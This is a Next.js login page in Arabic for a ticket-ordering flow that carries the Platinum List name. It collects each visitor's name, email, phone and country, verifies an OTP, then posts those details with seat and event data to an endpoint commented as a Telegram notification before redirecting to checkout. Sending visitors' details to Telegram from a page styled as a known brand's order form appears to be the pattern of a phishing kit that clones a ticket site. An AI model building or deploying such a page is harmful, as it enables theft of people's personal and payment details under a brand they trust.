'use client';
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import TicketFooter from '../../components/tickets/TicketFooter';
import LoginForm from '../../components/login/LoginForm';
import Header from '@/components/tickets/Header';
import OTPVerification from '../../components/login/OTPVerification';

const LoginPage = () => {
    const router = useRouter();
    const [selectedSeats, setSelectedSeats] = useState([]);
    const [eventData, setEventData] = useState({ pricing_currency: 'SAR' });
    const [initialFormData, setInitialFormData] = useState({});
    const [showOTPVerification, setShowOTPVerification] = useState(false);
    const [pendingFormData, setPendingFormData] = useState(null);
    const [userEmail, setUserEmail] = useState('');

    // Load order data from localStorage on mount
    useEffect(() => {
        const savedSeats = localStorage.getItem('selectedSeats');
        const savedEmail = localStorage.getItem('userEmail');
        const savedEventData = localStorage.getItem('eventData');

        if (savedSeats) {
            setSelectedSeats(JSON.parse(savedSeats));
        }

        if (savedEventData) {
            try {
                const parsedEventData = JSON.parse(savedEventData);
                setEventData(parsedEventData);
            } catch (error) {
                console.error('Error parsing event data:', error);
            }
        }

        // Pre-fill email if available
        if (savedEmail) {
            setInitialFormData(prev => ({ ...prev, email: savedEmail }));
        }

        // If no seats, redirect to hall selection
        if (!savedSeats || JSON.parse(savedSeats).length === 0) {
            router.push('/');
        }
    }, [router]);

    const handleFormSubmit = async (formData) => {
        try {
            // First, send OTP to the email
            const otpResponse = await fetch('/api/auth/send-otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ email: formData.email }),
            });

            const otpData = await otpResponse.json();

            if (otpData.success) {
                // Store the form data temporarily and show OTP verification
                setPendingFormData(formData);
                setUserEmail(formData.email);
                setShowOTPVerification(true);
            } else {
                alert(otpData.error || 'فشل في إرسال رمز التحقق');
            }
        } catch (error) {
            console.error('Error sending OTP:', error);
            alert('حدث خطأ أثناء إرسال رمز التحقق');
        }
    };

    const handleOTPVerified = async () => {
        // OTP verified successfully, proceed with original flow
        const userData = {
            email: pendingFormData.email,
            name: pendingFormData.name_full,
            phone: `${pendingFormData.countryCode}${pendingFormData.phone}`,
            country: pendingFormData.selectedCountry,
            countryId: pendingFormData.id_country
        };

        localStorage.setItem('userData', JSON.stringify(userData));
        localStorage.setItem('orderStep', 'user_info_completed');

        // Get event data from localStorage
        const eventData = JSON.parse(localStorage.getItem('eventData') || '{}');

        // Create session
        const session = {
            sessionId: Math.random().toString(36).substr(2, 9),
            timestamp: new Date().toISOString(),
            userData,
            selectedSeats
        };

        localStorage.setItem('userSession', JSON.stringify(session));

        console.log('User registered/logged in:', userData);
        console.log('Session created:', session);

        // Send user registration notification to Telegram
        try {
            const telegramResponse = await fetch('/api/auth/send-user-notification', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    ...userData,
                    selectedSeats,
                    sessionId: session.sessionId,
                    timestamp: session.timestamp,
                    eventData // Include event data in the notification
                }),
            });

            const telegramData = await telegramResponse.json();
            if (telegramData.success) {
                console.log('Telegram notification sent successfully');
            } else {
                console.error('Failed to send Telegram notification:', telegramData.error);
            }
        } catch (error) {
            console.error('Error sending Telegram notification:', error);
        }

        // Redirect to checkout
        router.push('/checkout');
    };

    const handleOTPCancel = () => {
        setShowOTPVerification(false);
        setPendingFormData(null);
        setUserEmail('');
    };

    return (
        <>
            <Header />
            <div className="modal-container container2">
                <div className="modal-container__container">
                    <div className="modal-container__content">
                        <div className="quick-order-form-step-two__content">

                            <div className="quick-order-form-step-two__title">الطلب السريع</div>
                            <div className="quick-order-form-step-two__sub-title">قدّم طلبك في ثوانٍ ببساطة بتوفير بعض التفاصيل!</div>

                            {/* Clean Login Form Component */}
                            <LoginForm
                                onSubmit={handleFormSubmit}
                                initialData={initialFormData}
                            />

                            <div className="quick-order-form-step-two__note">
                                <p className="auth-terms-note">
                                    من خلال التسجيل لإنشاء حساب أوافق على{' '}
                                    <a href="/ar/terms-and-conditions" className="auth-terms-note__link" target="_blank" rel="noopener noreferrer">
                                        شروط الاستخدام و سياسة الخصوصية
                                    </a>
                                    {' '}لشركة بلاتنيوم لِست.
                                </p>
                            </div>
                        </div>

                        <a
                            className="modal-container__close"
                            href="#"
                            onClick={(e) => {
                                e.preventDefault();
                                router.push('/');
                            }}
                        >
                            <svg className="icon icon-24-kit-cross">
                                <use xlinkHref="#svg-icon-24-kit-cross"></use>
                            </svg>
                        </a>
                    </div>
                </div>

                {/* Keep the smart footer */}
                {selectedSeats.length > 0 && (
                    <TicketFooter
                        selectedSeats={selectedSeats}
                        hideNextButton={true}
                        currency={eventData.pricing_currency}
                        onCheckout={() => {
                            console.log('Footer checkout clicked on login page');
                        }}
                    />
                )}
            </div>

            {/* OTP Verification Modal */}
            {showOTPVerification && (
                <OTPVerification
                    email={userEmail}
                    onVerified={handleOTPVerified}
                    onCancel={handleOTPCancel}
                />
            )}
        </>
    );
};

export default LoginPage; 